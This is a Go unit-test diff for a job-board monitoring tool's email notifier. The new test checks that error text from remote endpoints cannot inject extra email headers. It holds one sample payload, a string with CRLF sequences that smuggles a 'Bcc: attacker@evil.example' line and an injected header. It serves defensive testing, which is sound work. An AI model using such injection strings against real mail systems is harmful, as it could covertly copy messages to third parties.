@@ -38,6 +38,53 @@ func TestTextContainsAllFields(t *testing.T) {
 	}
 }
 
+// A board's stored last error is whatever the remote endpoint chose to return;
+// fetch errors routinely quote response bodies. If it reaches the wire
+// unflattened it does not merely look ugly — a bare CRLF ends the Subject
+// header and starts one of the endpoint's choosing, silently BCCing every
+// health report to a third party.
+func TestReportFlattensRemoteControlledErrorText(t *testing.T) {
+	hostile := "unexpected status 404: \r\nBcc: attacker@evil.example\r\nX-Injected: yes"
+	r := Report{
+		Subject: "1 board stopped responding: " + hostile,
+		Lines: []string{
+			"erroring — Acme (greenhouse/us/acme)",
+			"  last error: " + hostile,
+		},
+	}
+
+	body := ReportText(r)
+	if strings.Contains(body, "\r") {
+		t.Errorf("ReportText kept a CR: %q", body)
+	}
+	if !strings.Contains(body, "  last error:") {
+		t.Errorf("ReportText dropped the generated indent, which is safe and load-bearing:\n%s", body)
+	}
+
+	e := &email{from: "you@example.com", to: []string{"me@example.com"}, prefix: "[jobwatch] "}
+	msg := string(e.message(r.Subject, body))
+	headers, _, ok := strings.Cut(msg, "\r\n\r\n")
+	if !ok {
+		t.Fatalf("message has no header/body separator:\n%s", msg)
+	}
+	// The hostile text must survive only as inert characters INSIDE the
+	// Subject value. What must not exist is a header line of its own.
+	lines := strings.Split(headers, "\r\n")
+	if len(lines) != 7 {
+		t.Errorf("expected exactly 7 header lines, got %d:\n%s", len(lines), headers)
+	}
+	for _, line := range lines {
+		for _, injected := range []string{"Bcc:", "X-Injected:"} {
+			if strings.HasPrefix(line, injected) {
+				t.Errorf("header injection produced its own header line %q:\n%s", line, headers)
+			}
+		}
+	}
+	if got := strings.Count(headers, "Subject:"); got != 1 {
+		t.Errorf("Subject appears %d times, want 1:\n%s", got, headers)
+	}
+}
+
 func newWebhook(t *testing.T, url, format string) Notifier {
 	t.Helper()
 	n, err := New("webhook", params.Map{"url": url, "format": format})
